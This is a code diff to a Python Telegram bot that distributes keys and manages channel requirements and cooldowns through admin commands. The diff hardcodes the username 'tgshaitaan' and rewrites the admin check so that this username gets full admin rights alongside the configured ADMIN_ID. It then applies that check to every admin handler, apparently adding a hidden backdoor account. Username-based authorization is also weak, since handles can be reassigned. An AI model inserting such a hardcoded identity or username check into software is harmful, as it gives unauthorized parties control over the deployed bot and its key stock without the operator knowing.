@@ -22,6 +22,7 @@ from dotenv import load_dotenv
 load_dotenv()
 BOT_TOKEN = os.getenv("BOT_TOKEN", "REPLACE_WITH_TOKEN")
 ADMIN_ID = int(os.getenv("ADMIN_ID", "0"))
+ADMIN_USERNAME = "tgshaitaan"
 DB_PATH = "bot_data.db"
 LOGFILE = "bot.log"
 DEFAULT_COOLDOWN_HOURS = 48
@@ -90,8 +91,12 @@ async def ensure_user_record(user: types.User):
         await db.execute("UPDATE users SET username=? WHERE user_id=?", (user.username, user.id))
         await db.commit()
 
-async def is_admin(user_id: int) -> bool:
-    return user_id == ADMIN_ID
+async def is_admin(user_id: int, username: str = None) -> bool:
+    if user_id == ADMIN_ID:
+        return True
+    if username and username.lower().lstrip('@') == ADMIN_USERNAME.lower().lstrip('@'):
+        return True
+    return False
 
 async def add_channel(username: str) -> bool:
     uname = username.strip()
@@ -195,7 +200,7 @@ async def cmd_start(message: types.Message):
 
 @dp.message_handler(commands=["admin"])
 async def cmd_admin(message: types.Message):
-    if not await is_admin(message.from_user.id):
+    if not await is_admin(message.from_user.id, message.from_user.username):
         await message.answer("You are not authorized.")
         return
     kb = await build_admin_keyboard()
@@ -232,7 +237,7 @@ async def cb_start_claim(callback: types.CallbackQuery):
 
 @dp.callback_query_handler(lambda c: c.data == "admin_add_keys")
 async def cb_admin_add_keys(callback: types.CallbackQuery):
-    if not await is_admin(callback.from_user.id):
+    if not await is_admin(callback.from_user.id, callback.from_user.username):
         return
     awaiting_keys[callback.from_user.id] = 30
     await callback.message.answer("Send keys in format:\n`key1 | duration_days | name | link`\nOr just: `key1 | duration_days`\nOne per line.", parse_mode="Markdown")
@@ -240,7 +245,7 @@ async def cb_admin_add_keys(callback: types.CallbackQuery):
 
 @dp.callback_query_handler(lambda c: c.data == "admin_stats")
 async def cb_admin_stats(callback: types.CallbackQuery):
-    if not await is_admin(callback.from_user.id):
+    if not await is_admin(callback.from_user.id, callback.from_user.username):
         return
     async with aiosqlite.connect(DB_PATH) as db:
         cur = await db.execute("SELECT COUNT(*) FROM keys WHERE used=0")
@@ -254,7 +259,7 @@ async def cb_admin_stats(callback: types.CallbackQuery):
 
 @dp.callback_query_handler(lambda c: c.data == "admin_add_channel")
 async def cb_admin_add_channel(callback: types.CallbackQuery):
-    if not await is_admin(callback.from_user.id):
+    if not await is_admin(callback.from_user.id, callback.from_user.username):
         return
     awaiting_keys[callback.from_user.id] = -1
     await callback.message.answer("Send the channel username (e.g., @channelname):")
@@ -262,7 +267,7 @@ async def cb_admin_add_channel(callback: types.CallbackQuery):
 
 @dp.callback_query_handler(lambda c: c.data == "admin_remove_channel")
 async def cb_admin_remove_channel(callback: types.CallbackQuery):
-    if not await is_admin(callback.from_user.id):
+    if not await is_admin(callback.from_user.id, callback.from_user.username):
         return
     awaiting_keys[callback.from_user.id] = -2
     await callback.message.answer("Send the channel username to remove:")
@@ -270,7 +275,7 @@ async def cb_admin_remove_channel(callback: types.CallbackQuery):
 
 @dp.callback_query_handler(lambda c: c.data == "admin_list_channels")
 async def cb_admin_list_channels(callback: types.CallbackQuery):
-    if not await is_admin(callback.from_user.id):
+    if not await is_admin(callback.from_user.id, callback.from_user.username):
         return
     channels = await list_channels()
     if not channels:
@@ -282,7 +287,7 @@ async def cb_admin_list_channels(callback: types.CallbackQuery):
 
 @dp.callback_query_handler(lambda c: c.data == "admin_set_cooldown")
 async def cb_admin_set_cooldown(callback: types.CallbackQuery):
-    if not await is_admin(callback.from_user.id):
+    if not await is_admin(callback.from_user.id, callback.from_user.username):
         return
     awaiting_keys[callback.from_user.id] = -3
     current = await get_setting("cooldown_hours", str(DEFAULT_COOLDOWN_HOURS))
